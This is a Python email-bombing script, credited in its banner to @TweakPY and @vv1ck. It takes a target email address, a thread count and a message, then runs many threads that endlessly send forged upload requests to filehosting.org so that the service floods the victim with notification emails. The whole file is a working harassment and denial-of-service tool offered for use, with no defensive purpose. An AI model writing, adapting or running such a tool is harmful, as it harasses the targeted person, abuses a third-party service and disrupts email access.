try:from requests import post;import random,threading
except Exception as e:print(f'[!] Download The Missing Module ! , {e}');exit()
print("""
███████╗██████╗       ███████╗███╗   ███╗
██╔════╝██╔══██╗      ██╔════╝████╗ ████║
███████╗██████╔╝█████╗█████╗  ██╔████╔██║
╚════██║██╔═══╝ ╚════╝██╔══╝  ██║╚██╔╝██║
███████║██║           ███████╗██║ ╚═╝ ██║
╚══════╝╚═╝           ╚══════╝╚═╝     ╚═╝
         By @TweakPY - @vv1ck                                
	""")
email=input('[?] The Email : ')
Thread=int(input('[?] Thread : '))#Phone from 10 to 80 || PC computer from 100 to 900 as you Like ..
msg=input('[?] The Message : ')+"\t\t\t\t\t\t\t\t"
print("- - - - - - Started - - - - - -")
def SP_EM():  
	try: 
		msg2=msg+''
		chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
		for _ in range(45):
			msg2+=random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
		while 5283:
			req=post('https://www.filehosting.org/file/upload',data=f'uploader_email={email}&accept_tos=1&original_filename={msg2}&file_path=/mnt/filehosting/21/files/6/0/b/60b651f9a0b95dea&file_size=2509&file_type=text/plain',headers={'Host': 'www.filehosting.org','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Accept-Encoding': 'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','Content-Length': '221','Origin': 'https://upload.www21.filehosting.org','Referer': 'https://upload.www21.filehosting.org/','Upgrade-Insecure-Requests': '1','Te': 'trailers','Connection': 'close'}).status_code
			if req==200:print(f'Sent !!')
			else:print(f'Error Send ! ')
	except:pass
for JN in range(int(Thread)):
	t=threading.Thread(target=SP_EM)
	t.start()	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
